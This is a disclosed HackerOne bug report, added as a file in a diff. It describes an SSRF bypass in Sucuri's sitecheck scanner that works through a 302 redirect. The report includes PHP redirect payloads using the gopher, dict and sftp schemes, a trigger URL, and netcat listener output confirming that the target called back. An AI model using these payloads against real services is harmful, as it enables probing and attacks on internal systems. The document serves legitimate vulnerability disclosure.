@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/144724
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/orange
+ReportedTo:Sucuri(sucuri)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:04.08.2016 20:37:26
+
+Summary:
+
+Hi, Sucuri Security Team. I found a SSRF in https://sitecheck.sucuri.net/
+
+Although there was already an protection to prevent SSRF, but it can be bypassed by 302 redirection!
+
+**ssrf.php**
+> <?php header("Location: gopher://orange.tw:12345/_HELLO%20WORLD");
+
+by bisiting followed URL
+> https://sitecheck.sucuri.net/results/orange.tw/ssrf.php
+
+And your port will receive "HELLO WORLD"
+```
+orange@z:~$ nc -vvl 12345
+Listening on [0.0.0.0] (family 0, port 12345)
+Connection from [173.255.233.124] port 12345 [tcp/*] accepted (family 2, sport 57076)
+HELLO WORLD
+```
+
+There are also multiple PROTOCOL can be used, such as HTTP, HTTPS, SFTP, SCP, GOPHER, DICT...
+You can also use `DICT` and `SFTP` to get the version of `libssh` and `libcurl`
+  
+**Get libcurl version**
+> <?php header("Location: dict://orange.tw:12345/");
+
+**Get libssh version**
+> <?php header("Location: sftp://orange.tw:12345/");
+
+
+You can refer followed case to get more exploitations, such as Crafted SMTP connection exploit, Denial of service...
+> https://hackerone.com/reports/115748
